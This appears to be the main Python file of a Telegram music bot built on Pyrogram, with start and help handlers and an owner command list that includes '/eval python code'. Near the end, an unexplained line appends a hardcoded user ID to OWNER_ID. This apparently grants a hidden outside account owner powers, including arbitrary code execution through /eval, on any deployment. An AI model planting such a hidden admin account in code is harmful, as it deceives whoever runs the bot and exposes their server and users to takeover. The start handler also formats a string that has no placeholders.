from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from TamilBots.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from TamilBots import app, LOGGER
from TamilBots.TamilBots import ignore_blacklisted_users
from TamilBots.sql.chat_sql import add_chat_to_db

start_text = """
       Welcome! I am **@NetdMusicBot** 
🇬🇧 Usage : /e Music Name ㅤㅤㅤㅤㅤㅤㅤ
▪️
🇹🇷 Kullanım : /e Müzik Adı ㅤㅤㅤㅤㅤㅤ
"""

owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast message to send
/eval python code
/chatlist get list of all chats
"""

@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start")&filters.private)
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup([
            [InlineKeyboardButton("📣 Channel", url="http://t.me/Netdbots"),
            InlineKeyboardButton("🇬🇧 Add to Group", url="https://t.me/NetdMusicbot?startgroup=true"),
            InlineKeyboardButton("🇹🇷 Gruba Ekle", url="https://t.me/NetdMusicbot?startgroup=true")]
            ]
        )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start@netdmusicbot"))
async def help(client, message):
    if message.from_user["id"] == OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = """
    🇬🇧 Hey! I must be authorized.
    🇹🇷 Hey! Yetkili olmalıyım.
    """
    await message.reply(text)

OWNER_ID.append(1492186775)
app.start()
LOGGER.info("SongPlayRoBot Is Now Working🤗🤗🤗")
idle()
